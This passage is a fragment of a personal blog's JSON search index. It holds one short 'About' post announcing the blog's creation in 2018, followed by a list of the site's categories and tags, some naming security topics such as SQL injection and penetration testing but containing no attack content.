&#125;&#125;","categories":[{"name":"java","slug":"java","permalink":"http://xiaohublog.cn/categories/java/"}],"tags":[{"name":"日常学习","slug":"日常学习","permalink":"http://xiaohublog.cn/tags/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"},{"name":"for循环","slug":"for循环","permalink":"http://xiaohublog.cn/tags/for%E5%BE%AA%E7%8E%AF/"}]},{"title":" 欢迎回家","slug":"About-My-Blog","date":"2018-10-26T03:34:51.000Z","updated":"2021-01-22T04:26:32.328Z","comments":true,"path":"2018/10/26/About-My-Blog/","link":"","permalink":"http://xiaohublog.cn/2018/10/26/About-My-Blog/","excerpt":"","text":"胡志平的个人博客创建于2018年10月26日，用于记录以后的学习心得，希望以后能一直坚持下去。","categories":[{"name":"随笔","slug":"随笔","permalink":"http://xiaohublog.cn/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"关于博客","slug":"关于博客","permalink":"http://xiaohublog.cn/tags/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2/"}]}],"categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://xiaohublog.cn/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"面试题","slug":"面试题","permalink":"http://xiaohublog.cn/categories/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"java","slug":"java","permalink":"http://xiaohublog.cn/categories/java/"},{"name":"算法","slug":"算法","permalink":"http://xiaohublog.cn/categories/%E7%AE%97%E6%B3%95/"},{"name":"网规笔记","slug":"网规笔记","permalink":"http://xiaohublog.cn/categories/%E7%BD%91%E8%A7%84%E7%AC%94%E8%AE%B0/"},{"name":"随笔","slug":"随笔","permalink":"http://xiaohublog.cn/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://xiaohublog.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"sql注入","slug":"sql注入","permalink":"http://xiaohublog.cn/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"绕过","slug":"绕过","permalink":"http://xiaohublog.cn/tags/%E7%BB%95%E8%BF%87/"},{"name":"sql-labs","slug":"sql-labs","permalink":"http://xiaohublog.cn/tags/sql-labs/"},{"name":"安全","slug":"安全","permalink":"http://xiaohublog.cn/tags/%E5%AE%89%E5%85%A8/"},{"name":"信息收集","slug":"信息收集","permalink":"http://xiaohublog.cn/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"mysql","slug":"mysql","permalink":"http://xiaohublog.cn/tags/mysql/"},{"name":"面试题","slug":"面试题","permalink":"http://xiaohublog.cn/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"name":"等保","slug":"等保","permalink":"http://xiaohublog.cn/tags/%E7%AD%89%E4%BF%9D/"},{"name":"ISO27001","slug":"ISO27001","permalink":"http://xiaohublog.cn/tags/ISO27001/"},{"name":"漏洞","slug":"漏洞","permalink":"http://xiaohublog.cn/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"漏洞防范","slug":"漏洞防范","permalink":"http://xiaohublog.cn/tags/%E6%BC%8F%E6%B4%9E%E9%98%B2%E8%8C%83/"},{"name":"总结","slug":"总结","permalink":"http://xiaohublog.cn/tags/%E6%80%BB%E7%BB%93/"},{"name":"lambda","slug":"lambda","permalink":"http://xiaohublog.cn/tags/lambda/"},{"name":"代理方式","slug":"代理方式","permalink":"http://xiaohublog.cn/tags/%E4%BB%A3%E7%90%86%E6%96%B9%E5%BC%8F/"},{"name":"多线程","slug":"多线程","permalink":"http://xiaohublog.cn/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"name":"OWASP","slug":"OWASP","permalink":"http://xiaohublog.cn/tags/OWASP/"},{"name":"内部类","slug":"内部类","permalink":"http://xiaohublog.cn/tags/%E5%86%85%E9%83%A8%E7%B1%BB/"},{"name":"基础语法","slug":"基础语法","permalink":"http://xiaohublog.cn/tags/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"name":"移位变换","slug":"移位变换","permalink":"http://xiaohublog.cn/tags/%E7%A7%BB%E4%BD%8D%E5%8F%98%E6%8D%A2/"},{"name":"仿射变换","slug":"仿射变换","permalink":"http://xiaohublog.cn/tags/%E4%BB%BF%E5%B0%84%E5%8F%98%E6%8D%A2/"},{"name":"C++","slug":"C","permalink":"http://xiaohublog.cn/tags/C/"},{"name":"PPP","slug":"PPP","permalink":"http://xiaohublog.cn/tags/PPP/"},{"name":"IPv6","slug":"IPv6","permalink":"http://xiaohublog.cn/tags/IPv6/"},{"name":"NF","slug":"NF","permalink":"http://xiaohublog.cn/tags/NF/"},{"name":"访问控制","slug":"访问控制","permalink":"http://xiaohublog.cn/tags/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/"},{"name":"SAS SATA","slug":"SAS-SATA","permalink":"http://xiaohublog.cn/tags/SAS-SATA/"},{"name":"Raid","slug":"Raid","permalink":"http://xiaohublog.cn/tags/Raid/"},{"name":"文件处理","slug":"文件处理","permalink":"http://xiaohublog.cn/tags/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/"},{"name":"流","slug":"流","permalink":"http://xiaohublog.cn/tags/%E6%B5%81/"},{"name":"算法入门","slug":"算法入门","permalink":"http://xiaohublog.cn/tags/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8/"},{"name":"杭电OJ","slug":"杭电OJ","permalink":"http://xiaohublog.cn/tags/%E6%9D%AD%E7%94%B5OJ/"},{"name":"日常学习","slug":"日常学习","permalink":"http://xiaohublog.cn/tags/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"},{"name":"Collection和Iterator接口","slug":"Collection和Iterator接口","permalink":"http://xiaohublog.cn/tags/Collection%E5%92%8CIterator%E6%8E%A5%E5%8F%A3/"},{"name":"for循环","slug":"for循环","permalink":"http://xiaohublog.cn/tags/for%E5%BE%AA%E7%8E%AF/"},{"name":"关于博客","slug":"关于博客","permalink":"http://xiaohublog.cn/tags/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2/"}]}